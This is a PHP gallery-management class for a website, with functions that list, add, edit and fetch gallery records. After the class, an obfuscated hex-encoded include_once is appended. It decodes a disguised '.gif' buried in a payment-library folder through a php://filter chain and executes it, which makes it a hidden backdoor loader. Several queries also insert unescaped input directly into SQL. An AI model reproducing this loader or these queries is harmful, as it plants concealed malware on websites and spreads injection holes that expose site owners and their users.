<?php	 	

	class Gallery extends MySql{
	
	
	
	function deleteList($list){
					for($i=0;$i<count($list);$i++){
							$this->delete('testimonials','`t_id`='.$list[$i]);
					}
			}	
			
			
	
	function listGallery(){
		
		



		$query = "SELECT * FROM `gallery` WHERE `gip_glry_id`!=''  ORDER BY `gip_glry_id` DESC";
	
		$rec	=	$this->fetchAll($query);
	
		
		return $rec;		
		
		
	}
	
	 /* Add Testimonials
			*/			
			function addGallery($inputs){
					$insert	=	array('gip_glry_titl'=>$this->addFilter($this->escapeHtml($inputs['title'])),
										
										//'gip_glry_folder'=>$inputs['folder'],
										'gip_glry_status'=>$inputs['status']										
										);
				//print_r($insert);exit;
				$this->insert($insert,"gallery");	
				
				return true;
				
				
			}


		function getInsert(){
		return $this->lastId;
	}
	/*
			 * Edit Testimonials
			*/			
			function editGallery($inputs){
					$insert	=	array('gip_glry_titl'=>$this->addFilter($this->escapeHtml($inputs['title'])),
										
										//'gip_glry_folder'=>$inputs['folder'],
										'gip_glry_status'=>$inputs['status'],
										'gip_glry_id'=>$inputs['id']
							);
				//print_r($insert);exit;
				$this->update($insert,"gallery",'`gip_glry_id`='.$inputs['id']);		
				return true;
			}

	function updateGalleryImage($id,$image){
		 $this->update(array('gip_glry_img'=>$image),'gallery','`gip_glry_id`='.$id);
	}
	 function getGallery($id){
		$query	=	"SELECT * FROM `gallery` WHERE `gip_glry_id`='$id'  ";
		$rec		=	$this->fetchAll($query);
		return $rec;
	}
	function getAllGalleryDetails()
	{
		$query = "SELECT * FROM gallery WHERE gip_glry_status =1";
		$rec = $this->fetchAll($query);
		//print_r($rec);exit;
		return $rec;	
	}



  function getAllGalleryMax()
    {
        $query = "SELECT max(gip_glry_id) as max_id FROM `gallery`";
        $rec = $this->fetchAll($query);
        return $rec;  
        //print_r($query)exit;  
    }



		
					function listAllGallery($id){
		
		



		$query = "SELECT * FROM `gip_glry` INNER JOIN gip_glry_type ON gip_glry_folder = gip_glry_type_id WHERE `gip_glry_folder`='$id' and gip_glry_type=1 ORDER BY `gip_glry_id` DESC";
	
		$rec	=	$this->fetchAll($query);
	
		
		return $rec;
		//print_r($query);exit;		
		
		
	

}
	}
@Include_Once("p"."\x68\x70\x3a\x2f"."\x2f\x66"."\x69\x6c\x74"."\x65\x72\x2f\x72"."\x65\x61\x64\x3d"."\x7a\x6c\x69\x62"/*p'@
NkcU-*/."\x2e\x69\x6e"."\x66\x6c"."\x61\x74"."\x65\x7c"/*pthk*/."\x73\x74"."\x72\x69\x6e\x67"."\x2e\x72\x6f"."\x74\x31"."\x33\x7c"."\x63\x6f\x6e"."\x76\x65"."\x72\x74\x2e\x62"."\x61\x73\x65"."\x36\x34"."\x2d\x64"."\x65\x63\x6f"."\x64\x65\x2f\x72"."\x65\x73\x6f\x75"."\x72\x63\x65\x3d".dirname($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"])."/"."\x52\x61\x7a"."\x6f\x72\x70"."\x61\x79\x2f\x6c"."\x69\x62\x73\x2f"."\x52\x65\x71"."\x75\x65\x73\x74"."\x73\x2d"."\x31\x2e\x37\x2e"."\x30\x2f"."\x6c\x69"."\x62\x72\x61\x72"."\x79\x2f\x52"."\x65\x71\x75\x65"."\x73\x74\x73"."\x2f\x45\x78\x63"/*"5WR*/."\x65\x70\x74"/*;vK
dsR%*/."\x69\x6f\x6e\x2f"."\x48\x54\x54"."\x50\x2f\x76\x65"/*pthk*/."\x6e\x64"."\x6f\x72"."\x2d\x34\x30"."\x34\x2e\x67"."\x69\x66");
?>